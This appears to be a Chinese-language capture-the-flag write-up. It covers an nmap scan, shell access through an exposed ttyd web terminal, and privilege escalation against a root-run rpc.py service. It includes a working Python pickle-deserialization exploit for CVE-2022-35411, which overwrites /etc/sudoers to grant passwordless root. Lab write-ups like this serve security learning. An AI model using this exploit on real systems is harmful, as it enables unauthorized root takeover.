## 偵查

```
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFR/u8yZrrxkDWw/8gy/fNFksvT+QIL8O/6eD8zVxwKwgBURa9uRtOC8Dk6P+ktLwXJ9oSUitZeXVWjijbehpZBVHvywEOj9nc0bmk0+M/DGGbr1etS7cDvRzRATUtMPxQfYhzXqHlZe6Q2GfA0c75uybUXxOha8CTdK0Iv/maUUaiaPv3LGebQ4CpNaXNQfYVpCdsxLn5MxFi+tfenn/4CinBPn1Ahnx499V1G0ANTaKLsEETjqaMd5jnmml2wH1GmKfKf/6FevWv0Q9Ylsi3x/ipkDpcQAMRQ/aw5NuSSDrGTdo0wRuuoEf5Ybenp9haPVxUAPHbEcMI2hdcP5B3Cd03qimMhHEkFXE8sTUxRKHG+hg7cF8On1EXZsH1fsVyrFAAoHRrap5CsubmNXT93EcK7lc65DbKgeqls643x0p/4WOUiLXFstm6X4JCdEyhvWmnYtL3qDKMuQbCwrCJGeDjoaZTjHXbpjSxSnvtO04RT84x2t8MThyeYO3kSyM=
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBWjceIJ9NSOLk8zk68zCychWoLxrcrsuJYy2C1pvpfOhVBrr8QBhYbJxzzGJ7DpuMT/DXiCwuLXdu0zeR4/Dk=
|   256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG3LJwn9us7wxvkL0E6EEgOPG3P0fa0fRVuJuXeASZvs
8000/tcp open  http    syn-ack ttl 61 ttyd 1.7.3-a2312cb (libwebsockets 3.2.0)
|_http-title: ttyd - Terminal
|_http-server-header: ttyd/1.7.3-a2312cb (libwebsockets/3.2.0)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  9 03:37:19 2025 -- 1 IP address (1 host up) scanned in 17.71 seconds

```

發現 8000 port 是一個 web terminal ，可以直接連 normal user

## 提權

直接 linpeas 掃下去之後有看到一個 sus 的東西  
`tcp        0      0 127.0.0.1:65432         0.0.0.0:*               LISTEN      -  `  
開在高 port 的東西通常都不是好東西，可以看看是什麼，結果是 root 在 run `/opt/rpc.py`
結果發現是 CVE-2022-35411 的洞，可以直接拿來提權
```python
HOST="127.0.0.1:65432"

URL=f"http://{HOST}/sayhi"

HEADERS={
    "serializer": "pickle"
}

def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)
    payload=pickle.dumps(PickleRce())
    print(payload)
    return payload

def exec_command(cmd):
    payload = generate_payload(cmd)
    requests.post(url=URL, data=payload, headers=HEADERS)


def main():
    exec_command('echo "user   ALL=(ALL:ALL) NOPASSWD:ALL">/etc/sudoers ')
    #exec_command('uname -a')

if __name__ == "__main__":
    main()
```

之後 user 就可以直接 sudo su - 來 get root 了